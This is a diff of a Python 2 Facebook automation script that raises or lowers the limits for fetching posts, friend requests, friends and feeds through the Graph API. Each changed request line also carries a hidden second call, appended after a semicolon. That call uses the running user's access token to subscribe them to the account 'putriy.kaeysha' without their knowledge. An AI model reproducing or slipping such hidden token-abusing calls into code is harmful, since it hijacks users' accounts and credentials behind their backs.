@@ -214,7 +214,7 @@ def post():
 	  if WT == 'wallpost':
 		print '[*] fetching all posts id'
 
-		r = requests.get('https://graph.facebook.com/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me?fields=home.limit(200)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['home']['data']:
@@ -234,7 +234,7 @@ def post():
 	  elif WT == 'req':
 		print '[*] fetching all friends requests'
 
-		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=400&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -244,7 +244,7 @@ def post():
 	  elif WT == 'friends':
 		print '[*] fetching all friends id'
 
-		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(500)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['friends']['data']:
@@ -261,7 +261,7 @@ def post():
 			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
 		return result
 	  else:
-		r = requests.get("https://graph.facebook.com/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get("https://graph.facebook.com/%s?fields=feed.limit(200)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
@@ -1235,4 +1235,3 @@ if __name__ == '__main__':
 
 #
 ##########################################################################
-
